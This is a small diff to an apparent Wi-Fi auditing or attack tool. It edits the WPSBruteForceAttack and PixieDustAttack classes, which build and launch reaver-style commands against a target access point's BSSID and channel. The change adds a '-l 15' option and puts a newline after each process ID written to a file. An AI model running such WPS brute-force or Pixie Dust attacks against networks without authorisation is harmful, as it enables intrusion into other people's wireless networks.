@@ -29,6 +29,7 @@ class WPSBruteForceAttack(AbstractAttack):
             kwargs['interface'].monitor,
             '-b', kwargs['target'].bssid,
             '--channel', str(kwargs['target'].channel), 
+            '-l', '15',
             '-v', '4'] #verbose lvl 2
 
         result = AttackResultInfo(attack=cls.attack_name())
@@ -36,7 +37,7 @@ class WPSBruteForceAttack(AbstractAttack):
         p = sb.Popen(["stdbuf","-i0","-o0","-e0"]  + cmd, stdout=sb.PIPE, text = True)
         
         with open(utl.pids_file, "a") as f:
-            f.write(str(p.pid))
+            f.write(str(p.pid) + '\n')
 
         lockout_reported = False
         for line in p.stdout:
@@ -88,6 +89,7 @@ class PixieDustAttack(AbstractAttack):
             '-b', kwargs['target'].bssid,
             '--channel', str(kwargs['target'].channel), 
             '-d', #pixie dust
+            '-l', '15',
             '-v', '2'] #verbose lvl 2
 
         result = AttackResultInfo(attack=cls.attack_name())
@@ -95,7 +97,7 @@ class PixieDustAttack(AbstractAttack):
         p = sb.Popen(["stdbuf","-i0","-o0","-e0"]  + cmd, stdout=sb.PIPE, text = True)
 
         with open(utl.pids_file, "a") as f:
-            f.write(str(p.pid))
+            f.write(str(p.pid) + '\n')
 
         lockout_reported = False
         for line in p.stdout:
